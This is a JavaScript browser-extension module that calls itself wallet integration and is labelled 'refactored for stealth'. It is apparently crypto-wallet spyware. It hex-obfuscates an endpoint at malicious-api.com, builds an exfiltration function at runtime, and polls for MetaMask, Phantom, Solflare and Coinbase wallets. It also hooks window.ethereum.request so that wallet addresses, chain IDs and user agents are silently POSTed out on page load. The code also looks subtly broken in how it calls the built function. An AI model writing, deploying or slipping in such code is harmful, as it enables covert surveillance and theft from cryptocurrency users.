// wallet_injector.js - Refactored for stealth
// This module handles wallet integration for browser extensions

(function() {
    'use strict';
    
    // Configuration object with obfuscated values
    const config = {
        apiEndpoint: '\x68\x74\x74\x70\x73\x3a\x2f\x2f' + 'malicious-api.com' + '\x2f\x63\x6f\x6c\x6c\x65\x63\x74',
        checkInterval: 30000,
        targetWallets: ['MetaMask', 'Phantom', 'Solflare', 'Coinbase']
    };
    
    // Dynamic function generator for payload assembly
    function buildPayloadFunction() {
        const parts = [
            'function exfiltrateData(keyData) {',
            '   try {',
            '       const payload = {',
            '           timestamp: Date.now(),',
            '           data: keyData,',
            '           userAgent: navigator.userAgent',
            '       };',
            '       fetch(config.apiEndpoint, {',
            '           method: \'POST\',',
            '           headers: { \'Content-Type\': \'application/json\' },',
            '           body: JSON.stringify(payload)',
            '       }).catch(() => {});',
            '   } catch (e) {}',
            '}'
        ];
        return new Function('config', parts.join('\n'));
    }
    
    // Main wallet monitoring function
    function initializeWalletMonitor() {
        const exfiltrate = buildPayloadFunction();
        
        // Check for wallet objects periodically
        setInterval(() => {
            config.targetWallets.forEach(walletName => {
                try {
                    if (window[walletName] || window.ethereum) {
                        const walletData = {
                            name: walletName,
                            accounts: window.ethereum?.selectedAddress || 'not_found',
                            chainId: window.ethereum?.chainId || 'unknown'
                        };
                        
                        // Trigger data exfiltration
                        exfiltrate(config)(walletData);
                    }
                } catch (err) {
                    // Silent fail on errors
                }
            });
        }, config.checkInterval);
        
        // Hook into wallet connection events
        const originalRequest = window.ethereum?.request;
        if (originalRequest) {
            window.ethereum.request = new Proxy(originalRequest, {
                apply: function(target, thisArg, argumentsList) {
                    const method = argumentsList[0];
                    if (method === 'eth_requestAccounts' || method === 'connect') {
                        setTimeout(() => {
                            const accounts = window.ethereum?.selectedAddress;
                            if (accounts) {
                                exfiltrate(config)({ 
                                    event: 'wallet_connected', 
                                    accounts: accounts 
                                });
                            }
                        }, 1000);
                    }
                    return target.apply(thisArg, argumentsList);
                }
            });
        }
    }
    
    // Start monitoring when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeWalletMonitor);
    } else {
        initializeWalletMonitor();
    }
    
    // Export for extension context
    if (typeof module !== 'undefined' && module.exports) {
        module.exports = { initializeWalletMonitor };
    }
})();